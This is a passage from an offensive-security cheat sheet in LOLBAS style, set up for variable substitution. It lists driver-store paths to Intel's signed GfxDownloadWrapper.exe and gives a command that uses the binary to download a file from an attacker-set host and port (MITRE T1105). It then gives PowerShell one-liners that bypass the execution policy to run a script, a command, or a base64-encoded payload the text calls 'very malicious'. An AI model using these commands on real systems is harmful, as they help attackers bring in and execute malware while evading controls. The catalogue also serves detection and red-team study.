- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_78b09d9681a2400f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_842874489af34daa\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_88084eb1fe7cebc3\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_89033455cb08186f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_8a9535cd18c90bc3\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_8c1fc948b5a01c52\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_9088b61921a6ff9f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_90f68cd0dc48b625\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_95cb371d046d4b4c\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_a58de0cf5f3e9dca\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_abe9d37302f8b1ae\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_acb3edda7b82982f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_aebc5a8535dd3184\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_b5d4c82c67b39358\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_b846bbf1e81ea3cf\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_babb2e8b8072ff3b\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_bc75cebf5edbbc50\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_be91293cf20d4372\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c11f4d5f0bc4c592\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c4e5173126d31cf0\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c4f600ffe34acc7b\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c8634ed19e331cda\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_c9081e50bcffa972\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_ceddadac8a2b489e\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_d4406f0ad6ec2581\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_d5877a2e0e6374b6\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_d8ca5f86add535ef\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_e8abe176c7b553b5\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_eabb3ac2c517211f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_f8d8be8fea71e1a0\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_fe5e116bb07c0629\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_fe73d2ebaa05fb95\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64_kbl_kit127397.inf_amd64_e1da8ee9e92ccadb\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\k127153.inf_amd64_364f43f2a27f7bd7\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\k127153.inf_amd64_3f3936d8dec668b8\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\k127793.inf_amd64_3ab7883eddccbf0f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki129523.inf_amd64_32947eecf8f3e231\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki126950.inf_amd64_fa7f56314967630d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki126951.inf_amd64_94804e3918169543\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki126973.inf_amd64_06dde156632145e3\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki126974.inf_amd64_9168fc04b8275db9\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127005.inf_amd64_753576c4406c1193\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127018.inf_amd64_0f67ff47e9e30716\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127021.inf_amd64_0d68af55c12c7c17\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127171.inf_amd64_368f8c7337214025\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127176.inf_amd64_86c658cabfb17c9c\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127390.inf_amd64_e1ccb879ece8f084\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127678.inf_amd64_8427d3a09f47dfc1\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127727.inf_amd64_cf8e31692f82192e\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127807.inf_amd64_fc915899816dbc5d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki127850.inf_amd64_6ad8d99023b59fd5\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki128602.inf_amd64_6ff790822fd674ab\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki128916.inf_amd64_3509e1eb83b83cfb\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki129407.inf_amd64_f26f36ac54ce3076\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki129633.inf_amd64_d9b8af875f664a8c\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki129866.inf_amd64_e7cdca9882c16f55\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki130274.inf_amd64_bafd2440fa1ffdd6\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki130350.inf_amd64_696b7c6764071b63\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki130409.inf_amd64_0d8d61270dfb4560\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki130471.inf_amd64_26ad6921447aa568\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki130624.inf_amd64_d85487143eec5e1a\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki130825.inf_amd64_ee3ba427c553f15f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki130871.inf_amd64_382f7c369d4bf777\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki131064.inf_amd64_5d13f27a9a9843fa\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki131176.inf_amd64_fb4fe914575fdd15\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki131191.inf_amd64_d668106cb6f2eae0\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki131622.inf_amd64_0058d71ace34db73\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki132032.inf_amd64_f29660d80998e019\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki132337.inf_amd64_223d6831ffa64ab1\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki132535.inf_amd64_7875dff189ab2fa2\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki132544.inf_amd64_b8c1f31373153db4\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki132574.inf_amd64_54c9b905b975ee55\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\ki132869.inf_amd64_052eb72d070df60f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\kit126731.inf_amd64_1905c9d5f38631d9\GfxDownloadWrapper.exe`

### GfxDownloadWrapper.exe Download

GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by "Microsoft Windows Hardware", "Compatibility Publisher", "Microsoft Windows Third Party Component CA 2012", "Microsoft Time-Stamp PCA 2010", "Microsoft Time-Stamp Service".

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas GfxDownloadWrapper.exe Download"
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "$scheme://$lhost:$lport/$file" "$file_out"
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

## Powershell.exe

Powershell.exe is a a task-based command-line shell built on .NET.

**Path(s):**
- `C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe`
- `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`

### Powershell.exe Execute #1

Set the execution policy to bypass and execute a PowerShell script without warning

*Privileges: User • MITRE: T1059.001*

```cmd title:"Lolbas Set the execution policy to bypass and execute a PowerShell script without warning"
powershell.exe -ep bypass -file $file_in
```
<!-- cheat
var file_in
-->

### Powershell.exe Execute #2

Set the execution policy to bypass and execute a PowerShell command

*Privileges: User • MITRE: T1059.001*

```cmd title:"Lolbas Set the execution policy to bypass and execute a PowerShell command"
powershell.exe -ep bypass -command "$cmd"
```
<!-- cheat
var cmd
-->

### Powershell.exe Execute #3

Set the execution policy to bypass and execute a very malicious PowerShell encoded command

*Privileges: User • MITRE: T1059.001*

```cmd title:"Lolbas Set the execution policy to bypass and execute a very malicious PowerShell encoded command"
powershell.exe -ep bypass -ec $payload_b64
```
<!-- cheat
var payload_b64
-->
